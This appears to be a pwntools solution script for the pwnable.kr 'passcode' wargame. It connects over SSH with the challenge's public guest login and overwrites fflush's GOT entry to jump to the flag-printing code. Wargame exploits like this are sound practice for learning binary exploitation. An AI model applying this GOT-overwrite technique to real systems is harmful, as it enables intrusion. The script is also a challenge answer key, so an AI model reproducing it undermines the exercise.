from pwn import *

def get_string_rep(address):
    address = address.replace('0x', '')
    if len(address) != 8:
        print('address length must be 8')
        return None 
    chrs = [ chr(int(address[i:i+2],16)) for i in range(0, 8, 2) ]
    chrs.reverse()
    return ''.join(chrs)


payload_address = '0x080485D7'
fflush_got_address = '0x0804a004'
buffer_size = 100

session = ssh(host='pwnable.kr', user='passcode', port=2222, password='guest')
io = session.process('/bin/sh', env={"PS1":""})

io.sendline("./passcode")
io.sendline('{}'.format('a'*(buffer_size-4)+get_string_rep(fflush_got_address)))
io.recvrepeat(1)
io.sendline(str(int(payload_address,0)))

raw = io.recvrepeat(1)
# maybe change it so the address is after login ok and then split('\n')[0]?
print(raw.decode().split('\n')[1])  